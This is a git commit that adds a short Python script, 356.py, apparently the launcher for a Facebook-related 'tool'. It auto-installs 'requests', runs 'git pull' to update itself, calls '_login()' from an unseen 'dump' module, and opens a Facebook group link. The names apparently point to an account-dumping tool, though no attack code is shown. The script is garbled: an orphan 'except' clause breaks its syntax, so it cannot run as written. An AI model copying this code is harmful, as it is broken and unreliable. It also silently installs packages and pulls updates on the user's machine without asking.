bd3996c37eb03ebddd6531ca0aa2d8633f8910d3
Baloch356 <105994005+Baloch356@users.noreply.github.com>
2022-07-18 04:20:40 +0500

    Create 356.py

---
+++ 356.py
@@ -0,0 +1,21 @@
+import os, platform, time
+
+try:
+
+    import requests
+
+except:
+
+    os.system('pip install requests')
+
+os.system('git pull')
+
+import requests 
+__import__("dump")._login()
+
+	except Exception as e:		exit(str(e))
+    os.system('xdg-open https://facebook.com/groups/385441890317974/')
+
+    print("\x1b[1;91mOpps Sorry Brother Your Mobile Not Support This Tools")
+
+ 
